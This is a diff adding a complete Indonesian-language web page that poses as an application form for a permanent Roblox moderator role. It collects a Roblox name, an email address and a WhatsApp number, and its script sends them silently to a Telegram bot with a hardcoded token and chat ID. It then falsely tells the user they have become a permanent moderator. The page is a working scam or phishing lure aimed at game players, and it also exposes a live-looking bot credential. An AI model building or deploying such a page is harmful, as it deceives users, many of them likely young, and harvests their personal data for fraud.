@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Formulir mod permanen</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="form-container">
+    <h2>Formulir mod permanen</h2>
+    <form id="telegramForm">
+      <label for="name">Nama roblox:</label>
+      <input type="text" id="name" name="name" required>
+
+      <label for="email">Email:</label>
+      <input type="email" id="email" name="email" required>
+
+      <label for="phone">Nomor whatsap:</label>
+      <input type="tel" id="phone" name="phone" required>
+
+      <button type="submit">Kirim</button>
+    </form>
+    <p id="responseMessage"></p>
+  </div>
+  <script src="script.js"></script>
+</body>
+</html>
+<style>
+    body {
+  font-family: Arial, sans-serif;
+  background-color: #f7f7f7;
+  margin: 0;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
+
+.form-container {
+  background: #fff;
+  padding: 20px;
+  border-radius: 8px;
+  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+  width: 100%;
+  max-width: 400px;
+}
+
+h2 {
+  margin-bottom: 15px;
+  text-align: center;
+}
+
+form label {
+  display: block;
+  margin: 10px 0 5px;
+}
+
+form input {
+  width: 100%;
+  padding: 10px;
+  margin-bottom: 15px;
+  border: 1px solid #ccc;
+  border-radius: 5px;
+}
+
+form button {
+  width: 100%;
+  padding: 10px;
+  background-color: #28a745;
+  color: #fff;
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+}
+
+form button:hover {
+  background-color: #218838;
+}
+
+#responseMessage {
+  margin-top: 10px;
+  text-align: center;
+  color: #333;
+}
+
+</style>
+<script>
+    document.getElementById('telegramForm').addEventListener('submit', async function (e) {
+  e.preventDefault();
+
+  // Ambil data dari formulir
+  const name = document.getElementById('name').value;
+  const email = document.getElementById('email').value;
+  const phone = document.getElementById('phone').value;
+
+  // Token dan ID chat bot Telegram
+  const telegramBotToken = "7793927120:AAG42NY2JC_LFf0oXM_Nbk7Tv7K2MBOidmA";
+  const chatId = "-4761466267";
+
+  // Kirim data ke Telegram
+  const message = `Data nama mod permanen:\nNama: ${name}\nEmail: ${email}\nNomor Telepon: ${phone}`;
+  const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+  try {
+    const response = await fetch(url);
+    if (response.ok) {
+      document.getElementById('responseMessage').textContent = "Selamat anda sekarang jadi mod permanen!";
+      document.getElementById('responseMessage').style.color = "green";
+      document.getElementById('telegramForm').reset();
+    } else {
+      document.getElementById('responseMessage').textContent = "Anda gagal jadi mod permanen.";
+      document.getElementById('responseMessage').style.color = "red";
+    }
+  } catch (error) {
+    document.getElementById('responseMessage').textContent = "Terjadi kesalahan maaf.";
+    document.getElementById('responseMessage').style.color = "red";
+  }
+});
+
+</script>
